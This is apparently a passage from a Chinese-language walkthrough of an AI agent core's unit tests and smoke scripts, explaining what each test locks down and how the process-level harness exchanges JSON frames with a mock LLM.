📌 **`old_file_without_todos_reads_as_empty`** 对应 `store.py:96` 的 `normalize_todos(data.get("todos"))`—— **向前兼容**是持久化层的硬要求，否则升级插件等于丢历史。

#### 11.5.3 `test_mcp.py`（189 行 / 14 个）

| 组 | 测试 | 锁住什么 |
|---|---|---|
| 配置 | `parse_list_shape` / `parse_name_map_shape` | 两种写法都收 |
| 配置 | `disabled_servers_are_dropped` | `enabled:false` 不进连接池 |
| 配置 | `project_config_wins` | 项目 `.agent/mcp.json` 同名覆盖 settings |
| 配置 | `load_project_config` / `..._missing_is_empty` | 文件不存在返回空列表 |
| 辅助 | `tool_name_is_slugged` | `github/search` → 合法工具名（模型只能调合法标识符） |
| 辅助 | `flatten_error_result_raises` | MCP 返回 `isError` 时抛出，而不是当成功 |
| 辅助 | `parse_sse_body` | HTTP 传输的 `text/event-stream` 响应能解析 |
| 客户端 | `lifecycle` | `initialize` → `notifications/initialized` → `tools/list` |
| 客户端 | `missing_command_is_reported` | 配了 stdio 却没 command → 可读错误 |
| 管理器 | `refresh_registers_tools_and_calls_them` | 刷新后工具真的能调通 |
| 管理器 | `confirm_denied_skips_call` | 用户拒绝 → **根本不发请求** |
| 管理器 | `failed_server_is_recorded_and_disabled` | 启动失败的服务被标记并禁用，不会每次请求都重试 |

📌 **`project_config_wins` 是 07 卷里那个结论的实据**：合并是「项目级按名字覆盖 settings」，不是「谁后到谁赢」。没被覆盖的 settings 服务继续存在。

📌 **`failed_server_is_recorded_and_disabled`**：一个配错的 MCP 服务如果每次刷新都重试，会让界面卡十几秒。标记禁用后，用户必须手动修配置才能恢复。

#### 11.5.4 `test_codeindex.py`（128 行 / 9 个）

`FakeEmbedder`（L18-27）是这里的关键——它把真实模型换成一个**两维关键词向量**：

```python
18  class FakeEmbedder:
19      """Keyword-driven vectors: 'alpha' -> axis 0, anything else -> axis 1."""
21      model = "fake-embed"
23      async def embed(self, texts):
26                  vectors.append([1.0, 0.0] if "alpha" in text else [0.0, 1.0])
```

向量只有两个可能值，余弦相似度完全是确定的——检索测试因此**不需要模型也不需要网络**。

| 组 | 测试 | 锁住什么 |
|---|---|---|
| 分块 | `skips_ignored_directories` | `.git` / `node_modules` / `target` 不索引 |
| 分块 | `python_file_yields_function_chunks` | 按函数切块，不是按行 |
| 分块 | `unknown_language_falls_back_to_windows` | 不认识的语言 → 滑动窗口 |
| 存储 | `cosine_search_prefers_matching_vector` | 余弦相似度选对向量 |
| 存储 | `model_change_returns_no_hits` | **换 embedding 模型后旧向量不算命中** |
| 服务 | `build_then_incremental_skips_unchanged` | 增量构建跳过未变文件 |
| 服务 | `search_returns_semantic_hit` | 能搜到语义相关的内容 |
| 服务 | `search_before_build_is_empty` | 未建索引时返回空，不是报错 |
| 服务 | `status_reports_numpy_backend` | 状态里标明用的是哪种向量计算后端 |

📌 **`model_change_returns_no_hits` 是个容易被忽略的坑**：不同模型的向量空间**不可比**。它锁的是 `CodeStore.search(project, vector, model, limit)` 的 `model` 参数——

```python
88        store.replace_file(self.project, "src/alpha.py", "h1", "python",
89                           chunks, [[1.0, 0.0] for _ in chunks], "fake-embed")
90        self.assertEqual(store.search(self.project, [1.0, 0.0], "other-model"), [])
```

写入时打的标签是 `"fake-embed"`，查询时给的 `"other-model"` → **直接返回空**，不拿不可比的向量去算余弦。这比「按模型名分区」更简单：不匹配就不查。

📌 **这条测试也解释了 §10.2 第 11 行那个 bug 的严重性**：VS Code 壳下发 `embedding_model: ""`，Core 直接抛「未配置 Embedding 模型」（`codeindex/embeddings.py:57-58`），连分块都不会开始。

#### 11.5.5 `test_context.py`（135 行 / 9 个）

上下文裁剪是「长会话能不能活下去」的关键。九个测试分成两组：

**裁剪的安全性（6 个）**

| 测试 | 锁住什么 |
|---|---|
| `within_budget_is_untouched` | 不超预算就一个字不动（避免无谓的缓存失效） |
| `trimmed_round_takes_its_tool_results_with_it` | 裁掉一轮时，它的 tool 结果一起走 |
| `orphan_leading_tool_message_is_dropped` | 裁完后开头不能是孤立的 tool 消息 |
| `user_prompt_survives_aggressive_trimming` | **极端裁剪也要保住当前用户提问** |
| `newest_user_turn_is_kept_while_older_ones_go` | 保最新弃最旧 |
| `trim_tokenizes_each_message_once` | 性能：每条消息只算一次 token |

📌 **「孤儿 tool 消息」为什么致命**：OpenAI 协议要求 `role: tool` 消息必须紧跟在带 `tool_calls` 的 assistant 消息后面。如果裁剪把 assistant 删了却留下 tool 结果，请求会直接 400。这也是 `store.py:109-111` 那句 `while messages and messages[0].role == Role.TOOL: messages.pop(0)` 的原因。

**预算计算（3 个）**

| 测试 | 锁住什么 |
|---|---|
| `zero_window_falls_back_to_default` | `context_window: 0` → 用默认值，不是 0 |
| `window_scales_with_ratio` | 预算随窗口大小按比例变 |
| `clamped_at_both_ends` | 太小/太大都被夹到合理区间 |

#### 11.5.6 `test_native.py`（163 行 / 20 个）

`native` 是一个可选的 Rust 加速层（token 计数、语言识别、符号大纲、输出压缩）。20 个测试分成五组，其中**最值钱的是 `TestBackendParity`**。

| 组 | 测试 | 锁住什么 |
|---|---|---|
| Tokenizer | `empty_text` / `ascii_is_cheaper_than_cjk` / `short_text_stays_cheap` / `counting_is_monotonic` | 中文比英文贵（token 预算要真实） |
| Codesoup | `truncate_respects_budget` / `truncate_noop_when_within_budget` / `detect_language_by_extension` / `detect_language_by_shebang` / `python_outline` / `rust_outline_has_line_ranges` / `unknown_language_has_no_functions` / `outline_of_returns_labelled_lines` | 语言识别与符号提取 |
| 压缩 | `small_output_is_untouched` / `line_numbers_are_stripped` / `large_python_file_gets_outline` / `large_plain_text_falls_back_to_truncation` | 大输出先尝试「给大纲」而不是硬截 |
| **后端一致** | `detect_language_matches_fallback_table` / `outline_names_match_fallback` | **Rust 后端与纯 Python 回退给出相同结果** |
| 状态 | `backend_is_reported` / `rust_backend_loads_when_built` | 当前用的是哪个后端要说清楚 |

📌 **`TestBackendParity` 是整个 native 设计的底线**：Rust 模块是**可选**的（没编译就落到 Python 实现）。如果两边结果不一致，同一个项目在不同机器上会得到不同的大纲/截断，模型行为就不可重现。这两条测试强制「调优可以不同，结果必须相同」。

📌 **`line_numbers_are_stripped`** 对应 `read_file` 的 `N→` 前缀（§10.5）：文件内容被带行号送入压缩器时，行号会干扰符号识别，必须先剥掉。

#### 11.5.7 `test_version.py`（27 行 / 3 个）

```python
11  class VersionTest(unittest.TestCase):
12      def test_env_var_wins
16      def test_blank_env_falls_through
22      def test_protocol_reuses_package_version
```

| 测试 | 断言 | 为什么 |
|---|---|---|
| `env_var_wins` | `AGENT_CORE_VERSION=9.9.9` → `_resolve_version() == "9.9.9"` | 打包时可注入版本 |
| `blank_env_falls_through` | `"   "` → 返回非空 | 空环境变量不能把版本抹掉（否则 hello 帧里 `coreVersion` 为 `""`） |
| `protocol_reuses_package_version` | `CORE_VERSION == __version__` | **单一来源**（核心、hello 帧、MCP `clientInfo` 用同一个值） |

📌 第三个测试看着微不足道，但它防止的是「版本号漂移」：`protocol.py:13` 导入 `__version__`，`protocol.py:164` 直接写 `CORE_VERSION = __version__` —— **没有任何手写字符串**。而 `_resolve_version()` 有四级回退（`__init__.py:25-42`）：

```
AGENT_CORE_VERSION（发版构建注入）
  → 打包 exe 里的 core-build-info.json
    → importlib.metadata.version("agent-core")（pip 安装）
      → "0.0.0-dev"（源码目录直跑）
```

一旦有人把 `CORE_VERSION` 改成手写字符串，这条测试会立刻报错——因为「壳看到的版本」与「实际构建的版本」必须永远相等。

---

### 11.6 会话与记忆层：落盘、检索、记忆、用量

#### 11.6.1 `test_session_store.py`（228 行 / 14 个）

三个 class：`TestSessionStore`(27) / `TestSessionTranscriptCap`(115) / `TestSessionManagerHistory`(150)。

**存储层（基础读写）**

| 测试 | 锁住什么 |
|---|---|
| `save_then_load_keeps_rounds_and_metadata` | 存→读，消息与 title/updatedAt 都不丢 |
| `list_is_newest_first_with_title_and_preview` | 列表按 `updatedAt` 降序，带标题与预览 |
| `delete_removes_only_that_session` | 删一个不影响其它 |
| `delete_frees_bytes_and_drops_temp_file` | 返回值是**真释放的字节数**，同时清 `.tmp` |
| `delete_of_unknown_session_frees_nothing` | 删不存在的 → 返回 0，不抛异常 |
| `stale_temp_file_is_swept_on_list` | 超过 1 小时的 `.tmp` 在 `list` 时被清扫（`store.py:194-204`） |

📌 **`delete` 返回字节数是有产品意图的**（`store.py:145-150` 的 docstring）：壳要对用户说「已释放 X KB」。如果返回 `void`，壳只能编一个数字。 `test_delete_of_unknown_session_frees_nothing` 锁住了「不能为了好看报个假数」。

**截断层（最微妙）**

| 测试 | 锁住什么 |
|---|---|
| `trimming_never_starts_with_an_orphan_tool_result` | 截断后首条不能是 tool 消息 |
| `append_keeps_the_transcript_bounded` | 消息数不超过 `MAX_MESSAGES = 240` |
| `cap_never_orphans_a_tool_result` | 截断边界不能把「assistant(tool_calls) + tool」拦腰切断 |
| `session_is_restored_after_a_core_restart` | 重启后会话还能接着聊 |

📌 **`cap_never_orphans_a_tool_result` 对应 `store.py:106-111` 的 while 循环**：先 `[-240:]` 切，再从头部一直 `pop(0)` 直到首条不是 `Role.TOOL`。注意这个循环的代价——如果截断点刚好落在一个巨大工具输出中间，它可能连删好几条，实际消息数会小于 240。测试锁的是正确性，不是精确数量。

**管理器层（与内存/删除的交互）**

| 测试 | 锁住什么 |
|---|---|
| `detail_skips_tool_traffic` | `session/get` 不返回工具流水（壳不会渲染） |
| `list_merges_live_sessions` | **内存里刚建的会话也要出现在历史列表**（还没落盘） |
| `delete_drops_memory_and_disk` | 删除要同时清内存和文件 |
| `deleted_session_is_not_written_back_by_a_running_task` | **删除后正在跑的任务不能把文件写回来** |

📌 最后一条是全文件最值钱的：用户删了会话，但某个 `chat/start` 还在后台跑，回合结束时调 `store.save(session)` → 文件复活。管理器必须维护一个「已删除」的墓碑集合，`save` 前先查。这是一个经典的 **delete-during-write 竞态**，而且它只在「删除 + 长任务」同时发生时才出现，手工很难复现。

#### 11.6.2 `test_session_search.py`（120 行 / 9 个）

| 测试 | 锁住什么 |
|---|---|
| `chinese_substring_is_found_and_highlighted` | **中文子串能搜到**，结果带 `<mark>` 标记 |
| `english_words_match` | 英文按词匹配 |
| `short_query_falls_back_to_like` | 极短查询走 LIKE 回退（FTS 对 1-2 字符常常无效） |
| `unknown_query_returns_nothing` | 搜不到就空列表，不报错 |
| `limit_is_respected` | 上限生效 |
| `reindex_is_skipped_when_not_newer` | 文件没更新就不重建索引（mtime 比较） |
| `remove_drops_the_document` | 删会话时同时删索引文档 |
| `saved_session_is_searchable_and_delete_drops_it` | 端到端：存 → 搜到 → 删 → 搜不到 |
| `iter_documents_only_indexes_prose` | **只索引 user/assistant 正文**，不索引 tool 流水 |

📌 **`iter_documents_only_indexes_prose` 对应 `store.py:163-192`**，注释里写得很直白：工具流水是「噪音」，而且会把索引撑大一个量级。

📌 **`chinese_substring_is_found_and_highlighted` 解释了为什么不用纯 FTS**：中文没有空格分词，标准 FTS5 会把一整句当一个 token，搜「报销」搜不到「报销流程」。所以短词/中文走 LIKE 回退。

#### 11.6.3 `test_memory.py`（127 行 / 11 个）

| 组 | 测试 | 锁住什么 |
|---|---|---|
| 存储 | `save_and_get` | 存了能取回 |
| 存储 | `save_same_title_updates_in_place` | **同标题不新增行，而是原地更新** |
| 存储 | `search_by_keyword` | 关键词检索 |
| 存储 | `delete_removes_row` | 删掉数据库行 |
| 文件 | `markdown_mirror_written` | 同时写一份 Markdown 镜像（人可读、可进 git） |
| 文件 | `delete_removes_markdown` | 删记忆时镜像一起删 |
| 文件 | `global_scope_writes_outside_project` | `global` 作用域写到项目外（用户级） |
| 概览 | `overview_contains_saved_titles` | 概览里能看到已存的标题（进 system prompt 用） |
| 概览 | `overview_mode_when_empty` | 空记忆时给「概览模式」而不是空串 |
| 工具 | `save_then_recall` | 端到端：工具存 → 工具取 |
| 工具 | `delete_tool_reports_missing_id` | 删不存在的 id → 可读错误 |

📌 **`save_same_title_updates_in_place` 是记忆不膨胀的关键**：模型每次说「这个项目用 Maven」，不应该多出一条记忆，而是把原来那条的正文/时间更新。否则一个月后你有 50 条同名记忆，概览直接爆掉。

📌 **`global_scope_writes_outside_project`**：项目级记忆跟着仓库走（可提交、团队共享）；全局级跟着用户走（个人偏好）。两者物理上就不在一个目录，测试用「写到项目外」来锁这件事。

#### 11.6.4 `test_memory_pending.py`（203 行 / 22 个）

最大的一个测试文件之一。三个 class：`TestExtraction`(27) / `TestPendingStore`(72) / `TestCaptureAndPromote`(131)。

**抽取规则（只靠文本，不靠 LLM）**

| 测试 | 规则 |
|---|---|
| `instruction_sentence_becomes_a_candidate` | 「请记住 / 以后都 / 不要用」→ 候选 |
| `negated_instruction_is_kept` | **否定式的也要保留**（「不要用 var」同样是偏好） |
| `correction_becomes_a_candidate` | 「不对 / 应该是」→ 候选 |
| `questions_are_not_memories` | 带问号的不算 |
| `assistant_text_is_ignored` | 只看用户消息 |
| `code_fence_is_ignored` | 代码块里的内容不算 |
| `same_sentence_is_counted_once` | 同句多次出现只计一次 |
| `candidates_are_capped` | 候选数量有上限 |
| `title_drops_the_leading_marker` | 标题去掉开头的「记住，」之类 |
| `capture_skips_a_round_without_instructions` | 没有任何指令的回合不产生文件 |

📌 **这里最值得注意的是「不调 LLM」**：抽取是纯规则（正则 + 句式）。好处是**零成本、零延迟、离线可用**；代价是会漏（「这个项目我们用 Maven」这种陈述句不一定命中）。所以它只产生「待确认的候选」，真正的入库要用户点一下（`promote`）。

📌 **`negated_instruction_is_kept`**：早期的规则常常只抓「用 X」而漏「不要用 X」，导致用户的否定偏好完全不被记住。这条测试是防这个回归的。

**待处理存储（7 个）**

| 测试 | 锁住什么 |
|---|---|
| `add_writes_a_markdown_file_with_a_header` | 候选落成 Markdown，带标题头 |
| `add_is_idempotent_across_rounds` | 同一句在两轮里重复出现不会重复写 |
| `ids_keep_increasing_after_a_discard` | 丢弃后新候选的 id **继续递增**（不复用，避免 UI 串号） |
| `remove_drops_the_file_when_empty` | 最后一个候选被移除后文件删掉 |
| `update_rewrites_content_and_title` | 用户编辑后正文与标题一起改 |
| `get_returns_none_for_unknown_ids` | 未知 id 返回 `None`（不抛） |
| `capture_does_not_touch_the_overview` | 候选**不进概览**（未确认的东西不能污染 system prompt） |

📌 **`capture_does_not_touch_the_overview` 是一条安全线**：如果候选直接进概览，用户在聊天里随手说的一句「也许可以试试 pnpm」就会被当成项目规范发进每一轮 prompt。

**提升 / 丢弃（5 个）**

| 测试 | 锁住什么 |
|---|---|
| `promote_moves_the_candidate_into_memory` | 确认后从 pending 移到 memory |
| `promote_reports_a_likely_duplicate` | **与已有记忆相似时提醒**（不静默覆盖） |
| `promote_accepts_edited_content` | 用户改过正文后按改的存 |
| `promote_rejects_unknown_ids` | 未知 id 报错 |
| `discard_removes_only_that_candidate` | 丢弃只影响这一条 |

📌 **`promote_reports_a_likely_duplicate`** 对应 08 卷里那个「行内黄色提示（与已有记忆 #x 相似）」——不弹对话框，只在行内提醒。确认权始终在用户。

#### 11.6.5 `test_skills.py`（132 行 / 12 个）

| 组 | 测试 | 锁住什么 |
|---|---|---|
| frontmatter | `inline_list_and_body` | `tags: [a, b]` 行内列表 |
| frontmatter | `block_list` | `- a` 块列表 |
| frontmatter | `no_frontmatter` | 没有 `---` 也能当纯正文技能 |
| frontmatter | `missing_name_is_rejected` | 没 `name` 直接拒 |
| 加载 | `builtin_skills_are_loaded` | 包内置技能可读 |
| 加载 | `project_skill_overrides_global` | 项目级覆盖全局同名 |
| 加载 | `flat_markdown_file_is_accepted` | 单文件 `foo.md` 与目录 `foo/SKILL.md` 都认 |
| 加载 | `match_by_scenario` | 按场景字段匹配 |
| 服务 | `instruction_for_matches_daily_report` | 「生成日报」能命中日报技能 |
| 服务 | `instruction_for_explicit_name` | 点名技能名时直接命中 |
| 服务 | `no_instruction_without_match` | 没命中就**不注入任何指令** |
| 服务 | `tools_registered_and_callable` | 技能带的工具能注册且能调 |

📌 **`no_instruction_without_match` 是在保护「静默」**：技能系统最容易犯的错是不管三七二十一把所有技能说明都塞进 system prompt（多了几千 token，而且互相矛盾）。这里锁死「没匹配到就一个字不注入」。

📌 **两种文件布局都认（`flat_markdown_file_is_accepted`）**：`skills/foo.md` 与 `skills/foo/SKILL.md` 等价。后者才能在旁边放附件/脚本。

#### 11.6.6 `test_usage.py`（98 行 / 6 个）

| 测试 | 锁住什么 |
|---|---|
| `record_writes_one_json_line_per_task` | 一个任务一行 JSONL（可追加、可尾部读） |
| `report_aggregates_and_groups_by_day` | 报告按日聚合 |
| `old_lines_are_outside_the_window` | 超出天数的行不计入 |
| `rotation_archives_and_keeps_every_line` | **轮转归档：不丢行** |
| `report_of_an_empty_directory_is_zeroed` | 空目录 → 全 0，不报错 |
| `broken_lines_are_skipped` | 半行/脏行跳过（不因一行损坏而报整份报告失败） |

📌 **「轮转不丢行」是账本类数据的硬要求**：用量是给用户看的（「这个月花了多少」），丢一行就是帐不对。测试锁的是「归档 + 新文件」之后总行数不变。

📌 **JSONL 而不是 JSON 数组**：追加是 `O(1)`，不需要读取整个文件再重写；代价是可能出半行（写到一半崩），所以需要 `broken_lines_are_skipped`。

#### 11.6.7 `test_usage_totals.py`（66 行 / 3 个）

| 测试 | 锁住什么 |
|---|---|
| `usage_is_summed_across_tool_rounds` | 一次任务里多轮工具调用的 token **累加** |
| `missing_usage_stays_none` | 端点不返回 usage → 保持 `None`，**不写成 0** |
| `openai_style_total_key_is_kept` | `total_tokens` 这类字段要保留 |

📌 **`missing_usage_stays_none` 很重要**：0 和「不知道」是两件事。如果缺 usage 就记 0，报表里的平均值会被拉低，而且用户会以为不花钱。

#### 11.6.8 `fake_mcp_server.py`（71 行，不是测试）

这是给 `test_mcp.py` 用的**最小 MCP stdio 服务器**：

```python
10  TOOLS = [echo, boom]
46      if method == "initialize":
47          reply(request_id, {"protocolVersion": "2024-11-05", ...})
52      elif method == "tools/list":
54      elif method == "tools/call":
58          if name == "echo": ...  # 返回 "echo:" + text
61          elif name == "boom": ...  # isError: True
65          else: reply(..., error={"code": -32601, "message": "unknown tool"})
```

三个精心设计的点：

| 设计 | 目的 |
|---|---|
| `echo` 返回 `"echo:" + text` | 能验证参数真的传过去了 |
| `boom` 返回 `isError: true` | 触发 `flatten_error_result_raises` |
| 未知工具/方法回 `-32601` | 验证客户端的错误处理 |

📌 **为什么不用真 MCP 服务器**：真服务器需要 `npx`、网络、安装。一个 71 行的脚本让 `test_mcp.py` 在**任何机器上、离线**都能跑。这是「测试替身」的标准做法。

---

## 12. `core/scripts`：十份冒烟脚本与一份性能基线

第 11 节讲的是「函数级」验证：不跨进程，直接 `import` 模块、调函数、断言返回值。
这一节讲的是**进程级**验证：真的 `spawn` 一个 `python -m agent_core`，真的通过 stdin/stdout 收发 JSON 帧。

两个层面不能互相替代：

| 维度 | 单元测试（`core/tests`） | 冒烟脚本（`core/scripts`） |
|---|---|---|
| 启动进程 | 否，同进程 `import` | 是，`subprocess.Popen` |
| 序列化 | 不经过 JSON 文本 | 每个帧都是真的 `json.dumps` + `\n` |
| 编码 | 进程内 Unicode，无风险 | 跨管道编码，`PYTHONIOENCODING` 是必需的 |
| 事件循环 | 每个用例一个（`asyncio.run` / `IsolatedAsyncioTestCase`） | 一个长活进程，多任务并发 |
| 生命周期 | 无（函数返回即结束） | 有（启动 → 握手 → 索引 → 心跳 → 关闭） |
| 速度 | 298 个用例几秒 | 每个脚本 5–60 秒（含 `sleep` 与超时） |
| 失败信息 | 断言表达式 + 局部变量 | 只有几行 `print`，stderr 被丢弃 |

一句话：**单测锁语义，冒烟锁接线**。单测能证明 `decide("git push origin master") == "deny"`，
但不能证明这条判定结果真的顺着 `run_command` 工具回到了模型上下文里；冒烟脚本恰恰只证明后者。

### 12.1 十一份脚本总览

```
core/scripts/
├── smoke_rpc.py        127 行   最小可用：握手 / ping / 不可达端点报错
├── smoke_tools.py      170 行   工具往返：tool/invoke → tool/result → 收尾
├── smoke_ask.py        244 行   ask_user 双向交互 + 无能力时降级
├── smoke_command.py    213 行   run_command 三分类（auto / confirm / deny）
├── smoke_todos.py      186 行   chat/todos 广播 + 落盘
├── smoke_memory.py     178 行   Core 内置工具不外发给壳
├── smoke_mcp.py        217 行   两个 MCP 服务器 + agent/confirm
├── smoke_subagent.py   237 行   子代理池：角色目录 / 事件流 / 禁止递归
├── smoke_team.py       334 行   团队：预审卡 / 能力档 / 黑板交付物
├── smoke_v3.py         203 行   pending 记忆 / 会话检索 / 用量统计
└── bench_core.py       344 行   性能基线（不是测试）
```

合计 2,453 行。十份冒烟脚本的退出码约定完全一致：

| 退出码 | 含义 | 触发点 |
|---|---|---|
| `0` | 全部断言通过 | 最后一行 `print("... SMOKE PASS")` 之后 `return 0` |
| `1` | 有断言失败 | `failures` 列表非空，逐条打印 `FAIL: ...` |
| `2` | 基础设施失败（进程起不来 / 握手超时） | `no core/hello`、`the Core never said core/hello` |

`bench_core.py` 是唯一的例外：它**不做门禁**，只有「Core 根本起不来」才非零退出。
原因写在它的 docstring 第 15–17 行：

```python
 15  CI records the numbers instead of gating on them: machine differences would
 16  otherwise turn a real run red.  Exit code is non-zero only when the Core cannot
 17  be started at all.
```

在一台 8 核开发机和一台 2 核 CI runner 上，「单轮 300ms」这个数字的差异比代码回归带来的差异还大，
所以只记录、不判定。**性能门禁放在 CI 里几乎总是变成 flaky 测试**——把数字写进 `--json` 文件，
让人去看趋势，是更稳的选择。

### 12.2 公共骨架：四段式，但有两处关键分歧

十份脚本的 `main()` 骨架高度相似，可以拆成四段：

```
① 起 Mock LLM      ThreadingHTTPServer(("127.0.0.1", 0), MockLLMHandler)   随机端口
② 起 Core          Popen([sys.executable, "-m", "agent_core", ...])        stdin/stdout 管道
③ 收发帧            send(payload) / wait_for(predicate, timeout)
④ 收尾            stdin.close() → wait(5) → 仍活着就 kill() → server.shutdown() → rmtree
```

#### 12.2.1 段②的五个细节

```python
104      env = dict(os.environ)
105      env["PYTHONPATH"] = SRC_DIR + os.pathsep + env.get("PYTHONPATH", "")
106      env["PYTHONIOENCODING"] = "utf-8"
109      proc = subprocess.Popen(
110          [sys.executable, "-m", "agent_core", "--project-id", "smoke-ask",
111           "--data-dir", data_dir],
112          cwd=SRC_DIR, env=env, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
113          stderr=subprocess.DEVNULL, text=True, encoding="utf-8", bufsize=1,
114      )
```

| 细节 | 作用 | 少了会怎样 |
|---|---|---|
| `PYTHONPATH=src` | 让子进程能 `import agent_core` | `ModuleNotFoundError`，且因为 stderr 被丢弃**看不到原因** |
| `cwd=SRC_DIR` | 双保险；同时让相对路径（`.smoke-data`）落在 `core/src` 下 | 同上 |
| `PYTHONIOENCODING=utf-8` | 强制子进程 stdout 用 UTF-8 | Windows 中文系统上默认 cp936，含中文的帧会变成乱码或直接 `UnicodeEncodeError` |
| 父进程 `encoding="utf-8"` | 按 UTF-8 解码子进程输出 | 与上一行必须**成对**出现，否则一写一读不一致 |
| `bufsize=1` | 行缓冲 | 帧卡在管道缓冲区里，`wait_for` 永远等不到 |
| `stderr=DEVNULL` | 避免 Core 的 INFO 日志污染脚本输出 | 日志与 JSON 帧混在一起，`json.loads` 全失败 |

这里有一个**代价**：`stderr` 被彻底丢掉，意味着 Core 一旦启动崩溃（缺依赖、语法错误、
`ChatConfig` 校验失败），脚本只会打印 `FAIL: no core/hello` 然后退出 2——**没有任何诊断信息**。
调试冒烟脚本时，第一件事就是临时把 `stderr=subprocess.DEVNULL` 改成 `stderr=None`，
让 Core 的日志直接打到终端。这是一个明确的 DX 债，第 12.14 节会列进问题清单。

#### 12.2.2 段④：为什么是 close → wait → kill

```python
149      try:
150          proc.stdin.close()
151      except Exception:
152          pass
153      try:
154          proc.wait(timeout=5)
155      except Exception:
156          proc.kill()
```

`stdin.close()` 会让 Core 的 `_reader` 线程读到 EOF，往 `_lines` 队列里放一个 `None`；
`run()` 的主循环 `raw = await self._lines.get()` 拿到 `None` 就 `break`，进入 `finally` 分支：
取消心跳、取消索引任务、取消所有 `_tasks` 与 `_background`、`await self.mcp.shutdown()`。

所以这是**优雅关闭**：给 5 秒让它把会话写完（`session.save` 是 tmp + `os.replace`，中途被杀会留下 `.tmp`），
超时才 `kill()`。反过来只 `kill()` 的话，`smoke_todos.py` 里 `session/get` 的落盘断言会偶发失败。

#### 12.2.3 段③有两种写法，差别不是风格问题

**写法 A：队列消费式**（`smoke_rpc` / `smoke_tools` / `smoke_ask` / `smoke_command` / `smoke_todos` / `smoke_v3` / `bench_core`）

```python
52      def wait_for(predicate, timeout=20.0):
53          deadline = time.time() + timeout
54          while time.time() < deadline:
55              try:
56                  line = incoming.get(timeout=max(0.05, deadline - time.time()))
57              except queue.Empty:
58                  continue
59              if not line:
60                  continue
61              try:
62                  msg = json.loads(line)
63              except json.JSONDecodeError:
64                  continue
65              if predicate(msg):
66                  return msg
67          return None
```

从 `queue.Queue` 取，**不匹配的帧被丢弃**。后果：

- `wait_for(A)` 之后 `wait_for(B)`，即使 B 早就到过，也永远等不到——它已经被 A 那一轮吃掉了。
- 想断言「从来没出现过 X」，用这种写法**做不到**。

`smoke_command.py` 因此专门写了一个 `drain()`：

```python
115      def drain(seconds=1.0):
116          """Drop notifications that belong to the previous chat."""
117          deadline = time.time() + seconds
118          while time.time() < deadline:
119              try:
120                  incoming.get(timeout=0.05)
121              except queue.Empty:
122                  return
```

每开新一轮对话前先「倒掉」上一轮残留的帧，否则上一轮的 `chat/finish` 会被当成本轮的。
注意 `run_chat` 里调用的是 `drain(0.3)` 而不是默认的 `1.0`——这是一个**真实的时间窗 bug**：
如果上一轮的帧在 0.3 秒之后才到（磁盘慢、日志 flush 慢），它就会被下一轮的 `wait_for` 误收。

**写法 B：帧缓冲式**（`smoke_memory` / `smoke_mcp` / `smoke_subagent` / `smoke_team`）

```python
 81      received = []
 82      received_lock = threading.Lock()
 94              with received_lock:
 95                  received.append(message)
...
102      def wait_for(predicate, timeout=30.0):
103          # Buffer every frame so later assertions never lose an earlier message.
105          deadline = time.time() + timeout
106          cursor = 0
107          while time.time() < deadline:
108              with received_lock:
109                  window = received[cursor:]
110                  cursor = len(received)
111              for message in window:
112                  if predicate(message):
113                      return message
114              time.sleep(0.05)
115          return None
```

关键在 `cursor = 0` 是**函数内局部变量**，每次调用都从 0 开始。所以：

1. 第一次循环的 `window = received[0:]` 是**整个历史**；
2. 于是「3 秒超时」的 `wait_for` 实际上是「先扫一遍历史，命中就立刻返回，否则再等 3 秒」。

这正是 `smoke_mcp.py` 第 175 行能这么写的原因：

```python
175          invoke = wait_for(lambda m: m.get("method") == "tool/invoke", timeout=2)
176          if invoke:
177              failures.append("MCP tool was forwarded to the shell: %r"
178                              % (invoke.get("params", {}).get("toolName"),))
```

对话早就结束了，这行「等 2 秒」其实不会等——它在历史帧里翻，翻到任何一条 `tool/invoke` 就断言失败。
**这是「断言否定」的唯一可行写法**：你没法等一个不该出现的事件，只能事后回溯。

**写法 C：请求体记录式**

除了帧，还有第三种观测点——Mock LLM 收到的 HTTP 请求体。因为「模型看到了什么」只体现在那里面：

| 脚本 | 全局变量 | 断言内容 |
|---|---|---|
| `smoke_command` | `BODIES = []` | 拒绝文案 `已拒绝执行危险命令` 是否作为 `role=tool` 消息到达模型 |
| `smoke_ask` | `TOOL_CONTENT = {"text": ""}` | 工具结果里是否含 `进程内 LRU`（选项）与 `按天过期`（自定义答案） |
| `smoke_mcp` | `ROUNDS = []` | 工具消息里是否含 `echo:hi` 与 `echo:there` |
| `smoke_subagent` | `REQUESTS = []` | 主提示里是否含 `可委派的子代理`；子代理请求里是否**没有** `subagent_dispatch` |

三种写法不是随便选的：

```
要看「壳收到了什么」   → 写法 A（顺序断言）或 B（回溯断言）
要看「模型看到了什么」 → 写法 C（记录 HTTP body）
```

因为 `tool/result` 的最终归宿是**下一轮的 messages**，而不是某个通知帧。`smoke_command` 的 deny 场景
根本不发 `tool/invoke`（工具在 Core 内部就被拒了），壳那一侧什么都看不到，只能去请求体里找。

---

### 12.3 `smoke_rpc.py`：最小的那份，也是模板

它只干三件事，正好把 RPC 层的三条路径都走一遍：

| 步骤 | 帧 | 验证的路径 |
|---|---|---|
| 握手 | 等 `core/hello` | 启动 + 主动通知 |
| 请求/响应 | `{"id":"ping-1","method":"ping"}` → `{"id":"ping-1","ok":true,...}` | 带 id 的请求 |
| 错误路径 | `settings/update` 指向 `127.0.0.1:9` → `chat/start` → `chat/error` | 异步任务的失败上报 |

`127.0.0.1:9` 是个刻意的选择——9 号是 `discard` 协议端口，通常没进程监听，TCP 连接会立刻被拒绝（而不是超时挂住）。
所以这个「失败」用例几秒内就结束，不会把 CI 拖到超时。

第 99–107 行对失败的处理方式值得学：

```python
 99          error = wait_for(
100              lambda m: m.get("method") in ("chat/error", "chat/finish"), timeout=30
101          )
102          if error is None:
103              failures.append("no chat/error received")
104          elif error.get("method") == "chat/error":
105              print("OK chat/error code:", error["params"]["error"]["code"])
106          else:
107              print("OK chat/finish (unexpected but acceptable):", error["params"]["fullText"][:80])
```

它不硬性要求「必须是 error」——如果某个 provider 实现能在端点不可达时自己造一个兜底回答，
`chat/finish` 也算通过。**冒烟测的是「不会挂住」，不是「必须是某个错误码」**。这种宽容度在跨版本时不至于天天红。

### 12.4 `smoke_tools.py`：工具往返的最短闭环

```
chat/start
   ↓
Mock 第 1 轮：返回 tool_calls[read_file({"path":"README.md"})]
   ↓
Core → 壳：{"method":"tool/invoke", "params":{toolCallId, toolName, params, permission}}
   ↓
壳 → Core：{"id":"tr-1", "method":"tool/result", "params":{toolCallId, ok:true, result:"..."}}
   ↓
Mock 第 2 轮（看到 role=tool 了）：返回最终文本
   ↓
